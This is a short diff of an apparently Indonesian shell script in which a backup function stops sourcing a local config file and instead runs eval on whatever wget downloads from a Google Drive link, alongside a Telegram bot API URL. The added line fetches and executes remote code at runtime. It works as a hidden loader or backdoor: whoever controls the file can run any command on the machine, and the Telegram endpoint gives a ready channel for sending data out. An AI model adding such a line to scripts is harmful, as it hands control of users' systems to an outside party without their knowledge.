@@ -43,7 +43,7 @@ fun_bar() {
 
 # Fungsi Backupp sebelum Reset
 Backup() {
-source /usr/bin/var.conf
+eval $(wget -qO- "https://drive.google.com/u/4/uc?id=1eutPTYsea7xYx1mNBWDQ_g1Yx3ZPNimF")
 export TIME="10"
 export URL="https://api.telegram.org/bot$KEY/sendMessage"
 clear
